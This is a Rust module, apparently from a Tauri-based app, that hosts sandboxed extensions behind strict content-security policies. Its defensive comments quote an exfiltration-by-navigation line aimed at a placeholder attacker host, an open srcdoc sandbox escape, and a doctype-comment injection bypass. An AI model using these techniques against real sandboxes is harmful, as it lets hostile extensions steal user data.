//! Frame host — serves installed extension packages over localhost HTTP.
//!
//! Decision 002 (BX-09) hosts an extension as a `sandbox="allow-scripts"`
//! iframe pointed at a **remote-class** origin. That origin is this server: an
//! axum listener on `127.0.0.1:0`, mirroring `crate::media_proxy`.
//!
//! The origin class is the whole point. Tauri classifies every registered
//! custom URI scheme as *local*, and local origins bypass the app ACL — so a
//! registered scheme would hand the page all of Buzz's app commands. A plain
//! localhost HTTP origin is remote-class, its `Origin` header fails to parse at
//! Tauri's IPC boundary, and the invoke is rejected. That is what the BX-09
//! probe observed on Windows; see decision 002.
//!
//! **This server is therefore security-load-bearing in one direction only:** it
//! must never become a registered scheme, and it must never serve a byte from
//! outside an installed package. It grants no Buzz capability at all — there is
//! no bridge here, and P4's `window.buzz` is not injected by this module.
//!
//! # Egress surface — the full enumeration
//!
//! Two review rounds each found a new way out (navigation, then WebRTC), so
//! this lists every way a contained document can reach the network and names
//! the wall for each. A vector missing from this list is a bug in the list.
//!
//! | Vector | Wall |
//! |---|---|
//! | `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon` | `connect-src 'none'` |
//! | `location` / link / `window.open` / form submission | wrapper `frame-src <loopback>`; sandbox omits `allow-top-navigation` and `allow-popups` |
//! | `RTCPeerConnection` (STUN/TURN) | `webrtc 'block'` where honoured, **plus** the realm lockdown below — which governs the **initial document only** |
//! | `img`, `script`, `style`, `font`, `media`, `object` | `default-src 'none'`, widened only to the loopback origin per type |
//! | `<iframe>` / `blob:` frame | `frame-src 'none'` (from `default-src`) |
//! | `srcdoc` frame, **inline** child script | not a load, so `frame-src` misses it — the inherited policy has no `'unsafe-inline'`, so inline child script does not run |
//! | `srcdoc` frame, **external** child script | **OPEN — this is route 1.** The child inherits `script-src <loopback>`, so `<script src="…">` pointing at a package asset still runs, in a fresh realm the prologue never reached. Assigned to the isolation phase; **no wall in this file closes it** |
//! | `Worker` / `SharedWorker` | **unreachable** under the measured sandbox — a same-origin worker throws `SecurityError` (opaque origin) and `blob:` is not a `script-src` source. Measured on Chromium and WebKitGTK |
//! | `import()` / dynamic module | `script-src` is loopback-only |
//! | `<link rel=prefetch/prerender/dns-prefetch/preconnect>`, speculation rules | **Engine-specific, not a CSP theorem.** CSP's treatment of resource hints is unresolved upstream (`prefetch-src` was removed), so do not credit `default-src 'none'` generically. *Measured* on the shipping WebKitGTK: `preconnect` reached a live external TCP sink under a widened policy (1 connection) and reached it **0** times under the shipped default-deny policy, with `preconnect-attempted` true in both — and DNS prefetching is removed from that engine outright (getter deprecated, always FALSE). Treat as a per-engine row: re-measure on WebView2/WKWebView rather than assuming |
//! | Navigation by `<base>` retarget | `base-uri 'none'` |
//! | Form action retarget | `form-action 'none'` |
//! | `ping` attribute | `connect-src 'none'` |
//!
//! Not walls, and deliberately not relied upon: a `load`/reset handler (the
//! request has already gone), and any engine-wide switch — Buzz's own huddles
//! share this webview and use WebRTC, so a webview-wide switch would break them.
//! A per-webview engine policy (e.g. WebKitGTK's `enable-webrtc=false`) becomes
//! viable **only after** extensions move to a dedicated webview; until then the
//! wall must bind this frame, not the webview.
//!
//! # Two origins
//!
//! There are **two** listeners, on two ports, and the separation is a security
//! boundary rather than tidiness:
//!
//! - the **extension origin** serves package content (`/ext/<id>/…`) and the
//!   realm lockdown — the lockdown lives here because it is injected into the
//!   extension document, which must be same-origin with it under `script-src`;
//!
//! - the **wrapper origin** serves the trusted wrapper and nothing else.
//!
//! A hostile package therefore cannot reach the privileged document by
//! same-origin navigation: the wrapper route does not exist on its origin. That
//! matters because a pathname-scoped Tauri capability admits *any document at
//! that path*, so the defence has to be that the extension cannot arrive there
//! at all.
//!
//! Distinct **ports**, not a distinct hostname: `<name>.localhost` does not
//! resolve through an ordinary `files dns` resolver, so a listener there would
//! be unreachable. A different port is a different origin by definition.
//!
//! # Lifecycle
//!
//! Both listeners are reference-counted together by live frames, not started at
//! boot:
//!
//! - [`acquire`] starts both on the first frame and hands out both ports.
//! - [`release`] stops both when the last frame goes away — a closed tab, a
//!   navigation, or the preview flag being switched off (the frame unmounts in
//!   every one of those cases).
//! - [`shutdown_now`] stops both unconditionally on app exit, so a leaked
//!   holder count cannot outlive the process.
//!
//! Nothing listens when no extension frame is open, which is the state the app
//! is in almost all the time.

use std::net::Ipv4Addr;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, MutexGuard, OnceLock};

use axum::body::Body;
use axum::extract::{Path as RoutePath, State};
use axum::http::{header, HeaderValue, StatusCode};
use axum::response::Response;
use axum::routing::get;
use axum::Router;
use tokio::net::TcpListener;
use tokio::sync::oneshot;

use super::frame_authority::{
    content_security_policy_with_egress, static_owner, LeaseAuthority, LeaseOwner,
};
pub(crate) use super::frame_authority::{
    extension_for_lease, lease_authority, lease_authority_snapshot, release_for_extension_id,
    release_for_identity_extension,
};
#[cfg(test)]
pub(crate) use super::frame_authority::{
    insert_authorized_lease_for_test, insert_lease_for_test, lifecycle_guard, running_port,
};
use super::manifest::is_valid_extension_id;
use super::package_path::check_package_relative_path;

/// Path prefix every extension asset is served under.
pub(crate) const EXTENSION_ROUTE_PREFIX: &str = "ext";

/// Path prefix of the trusted wrapper document that hosts an extension.
pub(crate) const FRAME_ROUTE_PREFIX: &str = "frame";

/// Path of the host-authored lockdown script.
///
/// Served from the frame host rather than inlined, because the extension
/// document's `script-src` deliberately does **not** allow inline script — see
/// [`REALM_LOCKDOWN_SOURCE`].
pub(crate) const LOCKDOWN_ROUTE: &str = "host/extension-lockdown.js";

/// Why a request did not resolve to a servable file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum AssetError {
    /// The id did not match the install grammar.
    InvalidId,
    /// The path was absolute, traversing, or escaped the package root.
    UnsafePath,
    /// No such file inside the package (including "it is a directory").
    NotFound,
}

impl AssetError {
    fn status(self) -> StatusCode {
        // Every failure is a 404. Distinguishing "invalid id" from "no such
        // package" would let a caller enumerate what is installed.
        StatusCode::NOT_FOUND
    }
}

/// Resolve `<base>/<id>/<asset>` to a real file, or explain why not.
///
/// Separated from the server so the rules that matter can be tested without
/// binding a socket. Three independent gates, in order:
///
/// 1. **The id grammar** (`[a-z0-9_][a-z0-9_-]*`) — the same rule the installer
///    uses to name the directory. This is the wall: an id can never contain a
///    separator or `..`, so it cannot address anything but its own folder.
/// 2. **The relative-path rules** — platform-neutral, shared with the
///    installer, rejecting rooted, drive-prefixed and traversing paths.
/// 3. **Canonical containment** — both sides are canonicalised and the target
///    must still sit under the root. This is what catches a symlink planted in
///    an installed tree *after* install, which the first two gates cannot see.
pub(crate) fn resolve_asset(base_dir: &Path, id: &str, asset: &str) -> Result<PathBuf, AssetError> {
    if !is_valid_extension_id(id) {
        return Err(AssetError::InvalidId);
    }
    if check_package_relative_path(asset).is_err() {
        return Err(AssetError::UnsafePath);
    }

    let root = base_dir
        .join(id)
        .canonicalize()
        .map_err(|_| AssetError::NotFound)?;
    let target = root
        .join(asset)
        .canonicalize()
        .map_err(|_| AssetError::NotFound)?;

    if !target.starts_with(&root) {
        return Err(AssetError::UnsafePath);
    }
    if !target.is_file() {
        // Directories included: the host never lists a directory.
        return Err(AssetError::NotFound);
    }
    Ok(target)
}

/// Content type for a package asset, chosen by extension.
///
/// Deliberately a fixed table rather than content sniffing: what the host
/// claims a byte stream is should be a function of the package's own naming,
/// not of attacker-controlled bytes. Anything unrecognised is served as an
/// opaque download rather than guessed at.
fn content_type_for(path: &Path) -> &'static str {
    let extension = path
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    match extension.as_str() {
        "html" | "htm" => "text/html; charset=utf-8",
        "js" | "mjs" => "text/javascript; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "json" => "application/json; charset=utf-8",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "avif" => "image/avif",
        "ico" => "image/x-icon",
        "woff2" => "font/woff2",
        "woff" => "font/woff",
        "ttf" => "font/ttf",
        "wasm" => "application/wasm",
        "txt" | "md" => "text/plain; charset=utf-8",
        _ => "application/octet-stream",
    }
}

/// The `Content-Security-Policy` served with every extension document.
///
/// Decision 004: egress is **default-deny**. The host controls the document
/// bytes, so the host sets the policy; CSPs combine as an intersection, so an
/// extension cannot loosen this by injecting its own `<meta>`.
///
/// `'self'` is deliberately absent. A `sandbox="allow-scripts"` document has an
/// **opaque** origin, and `'self'` matches the document's origin — which for an
/// opaque origin matches nothing at all. A policy written with `'self'` would
/// silently block the package's own scripts. The serving origin is therefore
/// named explicitly.
///
/// `frame-ancestors` is omitted on purpose: it has no `default-src` fallback,
/// so leaving it out is what permits the Buzz window to frame this document at
/// all, and the parent's origin differs across platforms (`tauri://localhost`
/// vs `http://tauri.localhost`) — naming it would be a portability bug.
///
/// Manifest-declared `egress` origins are honoured only when the host-side
/// enabled-package record carries the same explicitly selected subset.
fn content_security_policy(origin: &str) -> String {
    content_security_policy_with_egress(origin, &[])
}

/// The `Content-Security-Policy` served with the trusted wrapper document.
///
/// `frame-src` is the **navigation wall**, and it is the reason the wrapper
/// exists at all. It names the frame-host origin, which deliberately leaves a
/// multi-page HTML extension able to navigate within itself. Non-HTML documents
/// reachable that way are neutralised by policy instead — see
/// [`asset_content_security_policy`] — rather than by forbidding navigation.
///
/// `connect-src 'none'` on the extension document stops fetch,
/// WebSocket and EventSource — it does **not** stop `location.href = "https://
/// attacker/?d=" + data`, because navigation is not a fetch directive. A
/// `sandbox="allow-scripts"` frame cannot navigate its parent, but it can
/// navigate *itself*, and the request carrying the data leaves before the frame
/// does. That was observed, not theorised: on WebKitGTK and in the browser
/// harness, against the exact header this host used to serve.
///
/// A nested browsing context's navigation is checked against the **container
/// document's** `frame-src`. So the extension runs one level in, inside a
/// document we serve, and any attempt to navigate itself anywhere but back to
/// this origin is refused before a request is made.
///
/// The wrapper is trusted (we author its bytes), so it may run its own script
/// and carry its own layout style — but nothing else: no network, no images,
/// no fonts, no media. Its `style-src` exists because its inline rules are what
/// make the extension fill the surface instead of a 300x150 default box.
/// `extension_origin` is the origin the wrapper is allowed to frame — a
/// *different* origin from the one serving this document.
///
/// # Why `frame-ancestors 'none'` is NOT here yet
///
/// It belongs here eventually: it is the confused-deputy wall, stopping a
/// hostile extension from embedding a wrapper to obtain a trusted instance with
/// itself as parent. Unlike `frame-src` it is enforced by the embedded document
/// against its embedder, so it binds even when the embedder is permissive.
///
/// **But Buzz currently frames this document itself.** `open_extension_frame`
/// returns the wrapper URL and `ExtensionFrame.tsx` renders it as
/// `<iframe src={target.url}>`, so `frame-ancestors 'none'` refuses the very
/// composition that ships — the extension surface goes blank. That was measured
/// in Chromium, not reasoned about: framed → 0 markers, top-level → 1.
///
/// **Reinstate it when, and only when, the wrapper becomes the top-level
/// document of the dedicated native webview.** Adding it before that migration
/// breaks the product.
///
/// Deferring is safe in the composition that ships today, for two independent
/// reasons — this is a sequencing decision, not an accepted hole:
///
/// 1. the extension document's own policy is `default-src 'none'` with **no**
///    `frame-src`, so a hostile package cannot frame anything at all, let alone
///    a wrapper;
/// 2. **no capability grants the bridge**, so a wrapper instance obtained by a
///    confused deputy would hold no authority worth stealing.
///
/// Both of those change at the same migration that makes the header safe to add.
fn wrapper_content_security_policy(extension_origin: &str) -> String {
    format!(
        "default-src 'none'; \
         frame-src {extension_origin}; \
         script-src 'unsafe-inline'; \
         style-src 'unsafe-inline'; \
         connect-src 'none'; \
         base-uri 'none'; \
         form-action 'none'"
    )
}

/// The trusted wrapper document that hosts one extension frame.
///
/// Two jobs, and deliberately nothing else:
///
/// 1. **Be the navigation container** whose `frame-src` bounds the extension.
/// 2. **Relay the BRIDGE_SPEC §2 handshake.** The wrapper adds a hop between
///    the extension and Buzz, so the extension's `parent` is this document
///    rather than the app. This forwards `{buzz:…}` messages up, and forwards
///    messages *down* with their transferred ports intact, so P4's
///    `MessageChannel` still reaches the extension. Buzz's source-identity
///    check therefore matches this wrapper's window — which is the frame Buzz
///    itself created — and the wrapper embeds exactly one extension, so the
///    attribution stays one-to-one.
///
/// This relays; it does not interpret. No bridge, no `window.buzz`, no method
/// dispatch — those are P4.
fn wrapper_document(entry_url: &str) -> String {
    format!(
        r#"<!doctype html>
<meta charset="utf-8">
<title>extension frame</title>
<style>html,body{{margin:0;height:100%}}iframe{{display:block;border:0;width:100%;height:100%}}</style>
<iframe id="ext" sandbox="allow-scripts" src="{entry_url}"></iframe>
<script>
(function () {{
  var frame = document.getElementById("ext");
  // Extension -> Buzz. Only messages from the one frame we embed.
  // Only handshake envelopes cross this relay. Everything else is either the
  // extension's own business or, after the port transfer, travels on the port
  // directly — so a wider relay would be surface for nothing.
  function envelope(data, name) {{
    return data && typeof data === "object" && data.buzz === name;
  }}
  window.addEventListener("message", function (event) {{
    if (event.source === frame.contentWindow) {{
      if (envelope(event.data, "ready")) {{
        // No ports forwarded up: the host originates the channel (BRIDGE_SPEC
        // §2) and must not adopt one arriving from the frame side.
        parent.postMessage(event.data, "*");
      }}
      return;
    }}
    if (event.source === parent) {{
      if (envelope(event.data, "port")) {{
        frame.contentWindow.postMessage(event.data, "*", event.ports);
      }}
    }}
  }});
}})();
</script>
"#
    )
}

/// The realm lockdown, served as a file and injected as an external script.
///
/// **The third egress wall, and it governs the initial document only.**
/// `connect-src 'none'` closes fetch/WebSocket/
/// EventSource/`sendBeacon`; the wrapper's `frame-src` closes navigation.
/// Neither touches `RTCPeerConnection`, which reaches the network on its own — a
/// controlled TURN sink received attacker-chosen data in the TURN `username`
/// with no fetch and no navigation.
///
/// `webrtc 'block'` is served too, but it is **not** honoured everywhere: the
/// browser harness used here reports *"Unrecognized Content-Security-Policy
/// directive 'webrtc'"* and delivered the sink identical packets with and
/// without it. It cannot be the only wall.
///
/// Neutralising a global is theatre if the page can open a fresh realm and read
/// a pristine copy — and it **was** theatre in the first attempt here: a
/// `srcdoc` child ran its own inline script and constructed a peer connection
/// from its own clean realm. `frame-src 'none'` does not stop a `srcdoc` child,
/// because that is not a network load; the child simply inherits this policy.
///
/// Inheriting a policy with **no inline script** closes the *inline* form of
/// that route, and only that form. Under `script-src {origin}` with no
/// `'unsafe-inline'`:
///
/// - a `srcdoc` child inherits the policy, so its **inline** script does not
///   run;
/// - a `blob:` child is a load, so `frame-src 'none'` refuses it;
/// - a popup cannot open — the sandbox omits `allow-popups`;
/// - a sibling realm is unreachable: every sandboxed context gets its own
///   opaque origin, so `contentWindow` access throws `SecurityError`;
/// - a worker realm is **unreachable** — a same-origin worker throws
///   `SecurityError` against the opaque origin, and `blob:` is not a
///   `script-src` source. Measured on Chromium and WebKitGTK.
///
/// # What this does NOT close: route 1
///
/// A `srcdoc` child may load an **external** script from the package, because
/// it inherits `script-src {origin}` and package assets are served from that
/// origin:
///
/// ```html
/// <iframe srcdoc="<script src='/ext/<id>/escape.js'></script>">
/// ```
///
/// That script runs in a fresh realm the prologue never reached, with a
/// pristine `RTCPeerConnection`. **No wall in this file closes it.** It is
/// route 1, it is open, and it is assigned to the isolation phase — the
/// boundary there is process/webview isolation, not another script-layer
/// mechanism.
///
/// So the initial document has exactly one realm this file governs; it is
/// **not** the only realm the page can reach. The properties listed above are
/// asserted in the browser tests, and the external-script route is deliberately
/// left unasserted because it is known-open rather than covered.
///
/// **Consequence for extension authors:** packages must ship their code as
/// `.js` files. Inline `<script>` and inline event handlers do not run.
pub(crate) const REALM_LOCKDOWN_SOURCE: &str = concat!(
    "(function(){try{",
    "var gone=[\"RTCPeerConnection\",\"webkitRTCPeerConnection\",",
    "\"mozRTCPeerConnection\",\"RTCDataChannel\",\"webkitRTCDataChannel\"];",
    "for(var i=0;i<gone.length;i++){try{Object.defineProperty(window,gone[i],",
    "{value:undefined,writable:false,configurable:false});}catch(e){}}",
    "}catch(e){}})();"
);

/// Emit the served document with the lockdown guaranteed to execute first.
///
/// **Do not splice into the package's markup.** The previous version searched
/// for the first `<!doctype` and inserted after its `>`, which a package
/// defeats simply by opening with a commented-out doctype:
///
/// ```html
/// <!-- <!doctype html> -->
/// <!doctype html>
/// <script src="theirs.js"></script>
/// ```
///
/// The tag lands *inside the comment*, never runs, and the real document below
/// executes unprotected. Any rule of the form "find a landmark in attacker
/// markup and insert next to it" has this shape; the attacker chooses the
/// markup, so they choose where the landmark appears.
///
/// So the host writes its own prologue and the package's bytes follow it
/// verbatim. Nothing the package contains can execute before bytes that precede
/// it, and no later construct can retroactively comment out what came earlier.
/// A doctype of our own leads, so the document is still standards-mode; a second
/// doctype inside the package body is ignored by the parser, which is the
/// correct outcome for a document that already declared one.
fn document_with_lockdown(html: &str, origin: &str) -> String {
    format!("<!doctype html>\n<script src=\"{origin}/{LOCKDOWN_ROUTE}\"></script>\n{html}")
}

/// Content types that can become a **script-bearing realm** by being navigated
/// to or framed, but which the host cannot write a lockdown prologue into.
///
/// The SVG/XML document family. An `<svg>` served as a document is a realm: it
/// may carry inline handlers and `<script href>`, and a locked extension can
/// reach one simply by navigating its own frame to a package asset — shedding
/// the initial realm's lockdown without ever creating a child frame.
///
/// This is deliberately **not** "everything that is not HTML". A worker derives
/// its execution policy from its own response headers, so putting
/// `script-src 'none'` on served JavaScript would break legitimate workers and
/// `importScripts`. Scripts, styles, fonts and images are *subresources*: they
/// do not get a realm, and they keep what they legitimately need.
///
/// Reachability, so the list is not read as a claim about current exposure:
/// only `image/svg+xml` is presently reachable. `content_type_for` maps
/// `.xml`/`.xhtml` to `application/octet-stream` with `nosniff`, which is
/// inert, so those two entries close no live route today. They are deliberate
/// future-proofing against the MIME table gaining those extensions later —
/// kept so that change cannot silently open a route-2 vector.
const ACTIVE_NON_HTML_DOCUMENT_TYPES: &[&str] = &[
    "image/svg+xml",
    "application/xhtml+xml",
    "application/xml",
    "text/xml",
];

/// The policy served with one package asset, chosen by what it can become.
///
/// Two document classes, one invariant — *every document the extension can
/// navigate to or frame is covered*:
///
/// - **HTML** keeps `script-src <origin>` and receives the lockdown prologue.
/// - **SVG/XML documents** get `script-src 'none'`: they cannot be given a
///   prologue, so instead they are refused the ability to execute at all.
///   Rendering is untouched, so an `<img src="asset.svg">` still draws — an
///   image never runs script, and an SVG that wants to is the attack.
/// - **Subresources** are served the ordinary policy and are unaffected.
#[cfg(test)]
fn asset_content_security_policy(origin: &str, content_type: &str) -> String {
    asset_content_security_policy_with_egress(origin, content_type, &[])
}

fn asset_content_security_policy_with_egress(
    origin: &str,
    content_type: &str,
    egress: &[String],
) -> String {
    let base = content_security_policy_with_egress(origin, egress);
    if ACTIVE_NON_HTML_DOCUMENT_TYPES
        .iter()
        .any(|kind| content_type.starts_with(kind))
    {
        return base.replace(&format!("script-src {origin}"), "script-src 'none'");
    }
    base
}

#[derive(Clone)]
struct HostState {
    base_dir: PathBuf,
    /// Where package content lives. The wrapper needs this to build the
    /// `src` it frames and the `frame-src` that bounds it.
    extension_origin: String,
}

/// The package-content origin: assets and the realm lockdown.
///
/// **The wrapper route is deliberately absent here.** If the wrapper were also
/// served from this origin, the extension could reach the privileged document's
/// path by ordinary same-origin navigation, and a pathname-scoped capability
/// would then match a document the extension controls the arrival of.
fn build_extension_router(base_dir: PathBuf, extension_port: u16) -> Router {
    let state = HostState {
        base_dir,
        extension_origin: origin_for_port(extension_port),
    };
    Router::new()
        .route(&format!("/{LOCKDOWN_ROUTE}"), get(serve_lockdown))
        .route(
            &format!("/{EXTENSION_ROUTE_PREFIX}/{{context}}/{{digest}}/{{id}}/{{*asset}}"),
            get(serve_asset),
        )
        .with_state(state)
}

/// The trusted-wrapper origin. Serves exactly one route and nothing
/// package-authored, ever.
fn build_wrapper_router(base_dir: PathBuf, extension_port: u16) -> Router {
    let state = HostState {
        base_dir,
        extension_origin: origin_for_port(extension_port),
    };
    Router::new()
        .route(
            &format!("/{FRAME_ROUTE_PREFIX}/{{context}}/{{digest}}/{{id}}"),
            get(serve_wrapper),
        )
        .with_state(state)
}

/// The origin an extension frame is served from.
///
/// A literal `127.0.0.1` HTTP origin, which is **remote-class** to Tauri. It
/// must never become a `register_uri_scheme_protocol` scheme: Tauri classifies
/// registered schemes as local, local origins bypass the app ACL, and the BX-09
/// evidence would no longer describe what ships (decision 002's explicit
/// caveat).
pub(crate) fn origin_for_port(port: u16) -> String {
    format!("http://127.0.0.1:{port}")
}

/// The URL Buzz points its iframe at: the trusted wrapper, not the extension.
///
/// Buzz must never frame the extension document directly — doing so removes the
/// container whose `frame-src` is the navigation wall, which is exactly the
/// arrangement that leaked.
pub(crate) fn wrapper_url(origin: &str, context: &str, digest: &str, id: &str) -> String {
    format!("{origin}/{FRAME_ROUTE_PREFIX}/{context}/{digest}/{id}")
}

/// The URL of an installed extension's entry document.
///
/// Built host-side from the validated manifest so the frontend never composes a
/// URL into this boundary. Entry paths have already passed the installer's
/// relative-path rules, so the only thing needed here is percent-encoding of
/// each segment — a filename with a space or `#` would otherwise truncate or
/// mis-address the request.
pub(crate) fn frame_url(
    origin: &str,
    context: &str,
    digest: &str,
    id: &str,
    entry: &str,
) -> String {
    let encoded: Vec<String> = entry
        .split('/')
        .filter(|segment| !segment.is_empty())
        .map(|segment| {
            segment
                .bytes()
                .map(|byte| match byte {
                    b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                        (byte as char).to_string()
                    }
                    other => format!("%{other:02X}"),
                })
                .collect::<String>()
        })
        .collect();
    format!(
        "{origin}/{EXTENSION_ROUTE_PREFIX}/{context}/{digest}/{id}/{}",
        encoded.join("/")
    )
}

async fn serve_lockdown(State(state): State<HostState>) -> Response {
    let mut response = Response::new(Body::from(REALM_LOCKDOWN_SOURCE));
    let headers = response.headers_mut();
    insert(
        headers,
        header::CONTENT_TYPE,
        "text/javascript; charset=utf-8",
    );
    insert(
        headers,
        header::CONTENT_SECURITY_POLICY,
        &content_security_policy(&state.extension_origin),
    );
    insert(headers, header::X_CONTENT_TYPE_OPTIONS, "nosniff");
    insert(headers, header::CACHE_CONTROL, "no-store");
    response
}

async fn serve_wrapper(
    State(state): State<HostState>,
    RoutePath((context, digest, id)): RoutePath<(String, String, String)>,
) -> Response {
    let _fence = super::management::lifecycle_read_fence().await;
    let Some(owner) = static_owner(&context, &digest, &id) else {
        return empty(StatusCode::NOT_FOUND);
    };
    let entry_url = frame_url(
        &state.extension_origin,
        &context,
        &digest,
        &id,
        &owner.entry,
    );

    let mut response = Response::new(Body::from(wrapper_document(&entry_url)));
    let headers = response.headers_mut();
    insert(headers, header::CONTENT_TYPE, "text/html; charset=utf-8");
    insert(
        headers,
        header::CONTENT_SECURITY_POLICY,
        &wrapper_content_security_policy(&state.extension_origin),
    );
    insert(headers, header::X_CONTENT_TYPE_OPTIONS, "nosniff");
    insert(headers, header::CACHE_CONTROL, "no-store");
    response
}

async fn serve_asset(
    State(state): State<HostState>,
    RoutePath((context, digest, id, asset)): RoutePath<(String, String, String, String)>,
) -> Response {
    let _fence = super::management::lifecycle_read_fence().await;
    let Some(owner) = static_owner(&context, &digest, &id) else {
        return empty(StatusCode::NOT_FOUND);
    };
    let path = match resolve_asset(&state.base_dir, &id, &asset) {
        Ok(path) => path,
        Err(error) => return empty(error.status()),
    };
    let Ok(bytes) = tokio::fs::read(&path).await else {
        return empty(StatusCode::NOT_FOUND);
    };

    let content_type = content_type_for(&path);
    let bytes = if content_type.starts_with("text/html") {
        match std::str::from_utf8(&bytes) {
            Ok(html) => document_with_lockdown(html, &state.extension_origin).into_bytes(),
            // Install-time validation rejects non-UTF-8 entry documents, so
            // reaching here means the tree changed under us. Refuse rather than
            // serve an active document the lockdown could not be written into —
            // "it cannot execute anyway" is false, since a browser
            // replacement-decodes and runs the valid prefix.
            Err(_) => return empty(StatusCode::NOT_FOUND),
        }
    } else {
        bytes
    };

    let mut response = Response::new(Body::from(bytes));
    let headers = response.headers_mut();
    insert(headers, header::CONTENT_TYPE, content_type);
    insert(
        headers,
        header::CONTENT_SECURITY_POLICY,
        &asset_content_security_policy_with_egress(
            &state.extension_origin,
            content_type,
            &owner.egress,
        ),
    );
    // The package's own naming decides the type; never let a browser re-guess.
    insert(headers, header::X_CONTENT_TYPE_OPTIONS, "nosniff");
    insert(headers, header::CACHE_CONTROL, "no-store");
    response
}

fn insert(headers: &mut header::HeaderMap, name: header::HeaderName, value: &str) {
    if let Ok(value) = HeaderValue::from_str(value) {
        headers.insert(name, value);
    }
}

fn empty(status: StatusCode) -> Response {
    let mut response = Response::new(Body::empty());
    *response.status_mut() = status;
    response
}

// ── Lifecycle ────────────────────────────────────────────────────────────────

/// Two listeners, deliberately: the trusted wrapper and package content are
/// served from **different origins** so the extension cannot reach the
/// privileged one at all.
///
/// Distinct **ports** rather than a distinct hostname. `<name>.localhost` does
/// not resolve through an ordinary `files dns` resolver (verified on this host:
/// `getaddrinfo("buzz-extension-wrapper.localhost")` fails), so a real HTTP
/// listener there would be unreachable. A different port is a different origin
/// by definition, needs no name resolution, and behaves identically on every
/// platform.
pub(super) struct RunningHost {
    pub(super) extension_port: u16,
    wrapper_port: u16,
    shutdown_extension: oneshot::Sender<()>,
    shutdown_wrapper: oneshot::Sender<()>,
}

#[derive(Default)]
pub(super) struct FrameHostState {
    pub(super) running: Option<RunningHost>,
    /// Monotonic lifecycle epoch. A bind started under an older epoch may not
    /// install listeners or a lease after release/shutdown advanced it.
    epoch: u64,
    /// Leases handed to live frames and not yet released.
    ///
    /// A set of opaque ids rather than a count, because a count cannot tell
    /// "release the holder you took" from "release *a* holder". A frame whose
    /// open failed never received a lease, so its cleanup cannot decrement
    /// somebody else's — which is exactly the defect a bare counter had: one
    /// healthy frame plus one failed-open frame unmounting stopped the server
    /// still serving the healthy one.
    ///
    /// Maps the opaque lease to the extension id it was issued for. The map
    /// (rather than a set) is what lets the bridge resolve identity from a
    /// host-minted token instead of trusting a caller-supplied id.
    pub(super) leases: std::collections::BTreeMap<String, LeaseOwner>,
    /// Exact opaque static context -> lease. Wrapper and asset routing are
    /// direct map lookups; extension id is only a consistency check.
    pub(super) contexts: std::collections::BTreeMap<String, String>,
    /// Per-extension generation. A reinstall fence advances this even when no
    /// lease is visible, invalidating a bind paused before lease installation.
    extension_epochs: std::collections::BTreeMap<String, u64>,
}

static FRAME_HOST: OnceLock<Mutex<FrameHostState>> = OnceLock::new();

/// The shared state, recovering rather than panicking on a poisoned lock.
pub(super) fn host_state() -> MutexGuard<'static, FrameHostState> {
    let lock = FRAME_HOST.get_or_init(|| Mutex::new(FrameHostState::default()));
    match lock.lock() {
        Ok(guard) => guard,
        // A panic while holding this lock leaves the counters readable and the
        // data structurally fine; refusing to serve afterwards would be worse.
        Err(poisoned) => poisoned.into_inner(),
    }
}

/// A live frame's claim on the host. Opaque to the caller by design.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct FrameLease {
    /// Serves package content (`/ext/<id>/…`) and the realm lockdown. The
    /// lockdown stays here because it is injected into the *extension*
    /// document, which must be same-origin with it under `script-src`.
    pub extension_port: u16,
    /// Serves the trusted wrapper only. Nothing package-authored is ever
    /// served from this origin.
    pub wrapper_port: u16,
    pub lease: String,
    pub static_context: String,
    pub package_digest: String,
}

#[path = "frame_lifecycle.rs"]
mod frame_lifecycle;
#[cfg(test)]
pub(crate) use frame_lifecycle::acquire;
pub(super) use frame_lifecycle::fence_extension;
pub(crate) use frame_lifecycle::{acquire_authorized, release, shutdown_now};

// ── Tests ────────────────────────────────────────────────────────────────────

// `frame_host_tests.rs` outgrew the 1000-line ceiling, so it is split by what
// each group needs: pure functions, emitted documents/policies, and tests that
// drive a live listener. `frame_host_test_support` holds what they share.
#[cfg(test)]
#[path = "frame_host_policy_tests.rs"]
mod frame_host_policy_tests;
#[cfg(test)]
#[path = "frame_host_successor_tests.rs"]
mod frame_host_successor_tests;
#[cfg(test)]
#[path = "frame_host_test_support.rs"]
mod frame_host_test_support;
#[cfg(test)]
#[path = "frame_host_tests.rs"]
mod frame_host_tests;
#[cfg(test)]
#[path = "frame_host_wire_tests.rs"]
mod frame_host_wire_tests;
